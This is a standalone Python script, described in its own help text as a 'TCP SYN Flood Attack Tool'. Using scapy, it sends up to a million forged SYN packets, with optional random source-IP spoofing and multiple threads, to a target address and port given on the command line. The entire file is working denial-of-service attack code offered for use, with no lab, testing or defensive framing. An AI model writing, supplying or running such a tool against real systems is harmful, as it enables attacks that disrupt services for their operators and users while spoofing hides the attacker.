#!/usr/bin/env python3
import argparse
import random
import socket
import threading
import time
from scapy.all import send
from scapy.layers.inet import IP, TCP
from scapy.volatile import RandIP, RandShort

def syn_flood(target_ip, target_port, num_packets=1000000, spoof=False):
    """Send TCP SYN packets to target to perform a SYN flood attack"""
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    
    total_sent = 0
    for _ in range(num_packets):
        if spoof:
            source_ip = RandIP()
        else:
            source_ip = socket.gethostbyname(socket.gethostname())
        
        source_port = RandShort()
        
        # Create SYN packet
        syn_packet = IP(src=source_ip, dst=target_ip) / \
                     TCP(sport=source_port, dport=target_port, flags="S")
        
        # Send packet
        send(syn_packet, verbose=0)
        total_sent += 1
        
        if total_sent % 100 == 0:
            print(f"Sent {total_sent} packets")
            
    print(f"Attack complete. Sent {total_sent} packets")

def main():
    parser = argparse.ArgumentParser(description='TCP SYN Flood Attack Tool')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', type=int, help='Target port number')
    parser.add_argument('-c', '--count', type=int, default=1000000,
                        help='Number of packets to send (default: 1000000)')
    parser.add_argument('-s', '--spoof', action='store_true',
                        help='Spoof source IP addresses')
    parser.add_argument('-t', '--threads', type=int, default=1,
                        help='Number of threads (default: 1)')
    
    args = parser.parse_args()
    
    threads = []
    packets_per_thread = args.count // args.threads
    
    # Create and start threads
    for i in range(args.threads):
        thread = threading.Thread(
            target=syn_flood,
            args=(args.target_ip, args.target_port, packets_per_thread, args.spoof)
        )
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
        
    print("Attack completed")

if __name__ == "__main__":
    main()